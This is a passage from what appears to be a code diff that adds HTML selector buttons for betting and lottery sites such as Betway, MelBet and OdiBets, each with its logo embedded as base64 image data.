owFn2+Vms4nGs7X84TITDI8h9mRfrzrdG1AYnMArk32rDAR6ln+cQMickEM9HrTbAQ/WBgL9vFjD27xqzbtJPrJraz0XrTym/V7Q91gYZG8JC0KC07wQGptI47UqhZBgoAcOVDIshhrOhEoGSq7mkEC0z5dDzWZUQxWHJdBNDG8hPE92hCvEvHOCvtwb5vxvL1SX0GigsWAhFaiZzhVYTZOupVXHFBUKFqgI4Q+zwtgCgWScBV5L1INf1GGUWlqOmkFA4WdvE671gLxtRj+KqgyCDBN1AHilZpnz0QLIwKjhMcuC32htvnwZvkOiZ3moC/oCMVrscjOA5jRGep6542hYoHggWNLRVrb26wkCFyJe70+ZjsYpNBGpBR2aClQmPd+3xnQIGz93wbEsqJj357azUyg3mTV5Hlq3DBpNaGiHIfhw+/47545O3kIb1yMLndBlmLmeQMvlrG1ppu/Xd8Syh5C6FXFuw29oMoZB1guTQpWdGaiAUVUm2qFJwYIQBtjGkQcphgJVAKzhmZcPisPSerxw+OBhBkGjTmwNXNQ7sKA7BhbQi5Vfk6ptrTQr+tT/CQtCsm6BbVSS+7KRgOmCl6LN63SghX0+WIOvy/dFu2qINQhl5cPtmIdZt7r1d2ieDcWAuV/YSKIoudOEDAICd7tJ0sHvCYSqa/3R6upqGTJdIHz0mC2EdJ+t8sUx4iC4kwLz5lCv/sZopJDP50W8mG4VXudhDaKxfKGQF+ViepX1Hei6oFwQu+ELz755VlZwRhGTWrm8e/f2npjQ2VtDbxrpSAUtwoJWjNDYi1+bu+ti6YptbzX1nFu37qX76GKLSHBdHZgJp1vQvUftBG1T+1ruD+0hw8xOxmHyGZ4ugQVtDQSe41aGskv5/pEgc/o5Krrqu83PKfDjH0YqpJJo7MUfOgejOZdFi5/h8dKnEDiLmg5//PbsD6UVVVG6tlv+DK+uQflyyQ7tKlLO9dLD7D6PO+jUtw8OAe2GxeuV8yyMM1IyyKXANJehoDvHkzSomuJgbQmdbcAEZ9D02nz8CJ32MP8TAf3Lu/18vnDuqWyEtfaVs73fA/X+27pJO9DF/fsFKn2vOu8rHXqla/LuImS+D4xZFftApGXPJ1/hM3v0uRCJVj33rVQ03a7R1g/QdZ1+oC7eYOtYPB4/37PJzwxWS+hye14rPP1QvocKTv/O524TXaRXLKA0hjy/GzE/uXlS8zdA//I3Oh+XoWy8MC/J9FHQ/arGo10MdT7OHZfCM7kcwqOJadrNzz66TwAmaKdtBu6rrzHGmeNWNdQSejmYT9+n/PzjOz/QxU/th4FfvVY54ZXX3LuEWjG0aRdq/Q0QL/Eos4012w/eNNOncMYA1Hs4tJTPBpY5sZ7+H4qLCYSaya7LtWzU2f0e5Qghub4pf7j8aiVr1niySy6ke/ZR1FJReZQsm76pVfOvmkuTI1Mjo5N3G9sJ4/MBj3+qoAstUOwqo6I+k29nrcAMTN+y4ji2bMp5sPy3zfSJ9tHXaS4QKibEEK8NTL0otN2sZVFKfVBH3cfJv35G6UK9MO8Ynkbae801V58V9jc381cbzcnZP3tInxaslHQdI+UgGZJcCV+ol7RPRyEHD6vTJz0ivBJD+e8RiMWLHBin/yEEpxjiqdafPSyJRCKRSCQSiUQikUgkEolEIpFIJBKJRCKRSCQSiUQikUgkEolEIpFIJBKJRCKRSCQSiUQikUgkEolEIjkX/w9ZcdgLKlZW+gAAAABJRU5ErkJggg==" alt="MulaSport" style="height:32px;vertical-align:middle;"> MulaSport</button>   
+                    <button class="site-btn" data-site="lottostar"><img src="data:image/png;base64,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" alt="lottostar" style="height:32px;vertical-align:middle;"> lottostar</button>
+                    <button class="site-btn" data-site="Betway"><img src="data:image/png;base64,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" alt="Betway" style="height:32px;vertical-align:middle;"> Betway</button>
+                    <button class="site-btn" data-site="MelBet"><img src="data:image/png;base64,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" alt="MelBet" style="height:32px;vertical-align:middle;"> MelBet</button>
+                    <button class="site-btn" data-site="OdiBets"><img src="data:image/jpeg;base64,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